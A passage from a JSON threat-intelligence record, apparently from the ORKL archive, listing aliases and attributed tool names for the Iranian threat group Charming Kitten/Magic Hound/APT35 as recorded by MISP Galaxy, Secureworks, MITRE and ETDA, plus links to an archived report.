            "updated_at": "2025-03-27T02:00:02.815023Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Parastoo",
                "iKittens",
                "Group 83",
                "NewsBeef",
                "G0058",
                "CharmingCypress"
            ],
            "source_name": "MISPGALAXY:Charming Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
            "created_at": "2024-05-01T02:03:08.027871Z",
            "updated_at": "2025-03-27T02:05:17.313679Z",
            "deleted_at": null,
            "main_name": "COBALT ILLUSION",
            "aliases": [
                "APT42 ",
                "Charming Kitten ",
                "CharmingCypress ",
                "ITG18 ",
                "Magic Hound ",
                "Mint Sandstorm sub-group ",
                "NewsBeef ",
                "Newscaster ",
                "PHOSPHORUS sub-group ",
                "TA453 ",
                "UNC788 ",
                "Yellow Garuda ",
                "APT35 "
            ],
            "source_name": "Secureworks:COBALT ILLUSION",
            "tools": [
                " MagicHound Toolset",
                " PupyRAT",
                "Browser Exploitation Framework (BeEF)"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "25896473-161f-411f-b76a-f11bb26c96bd",
            "created_at": "2023-01-06T13:46:38.75749Z",
            "updated_at": "2025-03-27T02:00:02.910627Z",
            "deleted_at": null,
            "main_name": "CHRYSENE",
            "aliases": [
                "Greenbug"
            ],
            "source_name": "MISPGALAXY:CHRYSENE",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
            "created_at": "2022-10-25T15:50:23.808974Z",
            "updated_at": "2025-03-27T02:00:55.550912Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "Magic Hound",
                "TA453",
                "COBALT ILLUSION",
                "Charming Kitten",
                "ITG18",
                "Phosphorus",
                "APT35",
                "Mint Sandstorm"
            ],
            "source_name": "MITRE:Magic Hound",
            "tools": [
                "Impacket",
                "CharmPower",
                "FRP",
                "Mimikatz",
                "Systeminfo",
                "ipconfig",
                "netsh",
                "PowerLess",
                "Pupy",
                "DownPaper",
                "PsExec",
                "Havij",
                "sqlmap"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
            "created_at": "2022-10-25T16:07:23.83826Z",
            "updated_at": "2025-03-27T02:02:09.995863Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "APT 35",
                "Ballistic Bobcat",
                "Charming Kitten",
                "CharmingCypress",
                "Cobalt Illusion",
                "Cobalt Mirage",
                "Educated Manticore",
                "Magic Hound",
                "Mint Sandstorm",
                "Operation BadBlood",
                "Operation Sponsoring Access",
                "Operation SpoofedScholars",
                "Operation Thamar Reservoir",
                "Phosphorus",
                "TA453",
                "TEMP.Beanie",
                "Tarh Andishan",
                "Timberworm",
                "TunnelVision",
                "UNC788",
                "Yellow Garuda"
            ],
            "source_name": "ETDA:Magic Hound",
            "tools": [
                "7-Zip",
                "AnvilEcho",
                "BASICSTAR",
                "CORRUPT KITTEN",
                "CWoolger",
                "CharmPower",
                "ChromeHistoryView",
                "CommandCam",
                "DistTrack",
                "DownPaper",
                "FRP",
                "Fast Reverse Proxy",
                "FireMalv",
                "Ghambar",
                "GoProxy",
                "GorjolEcho",
                "HYPERSCRAPE",
                "Havij",
                "MPK",
                "MPKBot",
                "Matryoshka",
                "Matryoshka RAT",
                "MediaPl",
                "Mimikatz",
                "MischiefTut",
                "NETWoolger",
                "NOKNOK",
                "PINEFLOWER",
                "POWERSTAR",
                "PowerLess Backdoor",
                "PsList",
                "Pupy",
                "PupyRAT",
                "SNAILPROXY",
                "Shamoon",
                "TDTESS",
                "WinRAR",
                "WoolenLogger",
                "Woolger",
                "pupy",
                "sqlmap"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041771,
    "ts_creation_date": 1490001510,
    "ts_modification_date": 1490012960,
    "files": {
        "pdf": "https://archive.orkl.eu/a3882311c6d695923d6e11d6902d754891ec5d14.pdf",
        "text": "https://archive.orkl.eu/a3882311c6d695923d6e11d6902d754891ec5d14.txt",
        "img": "https://archive.orkl.eu/a3882311c6d695923d6e11d6902d754891ec5d14.jpg"
    }
}